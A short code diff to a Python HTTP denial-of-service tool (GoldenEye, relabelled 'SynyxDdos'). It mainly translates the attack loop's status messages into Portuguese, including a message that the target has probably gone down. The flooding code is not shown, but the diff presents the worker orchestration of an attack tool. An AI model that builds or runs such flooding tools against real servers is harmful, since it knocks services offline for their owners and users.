@@ -154,7 +154,7 @@ class GoldenEye(object):
     def fire(self):
 
         self.printHeader()
-        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets))
+        print("Atacando no modo '{0}' com {1} worker e {2} conexões. CTRL+C para cancelar.".format(self.method, self.nr_workers, self.nr_sockets))
 
         if DEBUG:
             print("Starting {0} concurrent workers".format(self.nr_workers))
@@ -171,7 +171,7 @@ class GoldenEye(object):
                 self.workersQueue.append(worker)
                 worker.start()
             except Exception:
-                error("Failed to start worker {0}".format(i))
+                error("erro no worker {0}".format(i))
                 pass
 
         if DEBUG:
@@ -186,7 +186,7 @@ class GoldenEye(object):
                 print("{0} SynyxDdos strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
-                    print("\tSe pa o bagulho ja caiu")
+                    print("\tSe pa ja caiu")
 
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
@@ -205,11 +205,11 @@ class GoldenEye(object):
                 self.stats()
 
             except (KeyboardInterrupt, SystemExit):
-                print("CTRL+C received. Killing all workers")
+                print("CTRL+C, parando ataque.")
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print("Killing worker {0}".format(worker.name))
+                            print("parando worker {0}".format(worker.name))
                         #worker.terminate()
                         worker.stop()
                     except Exception:
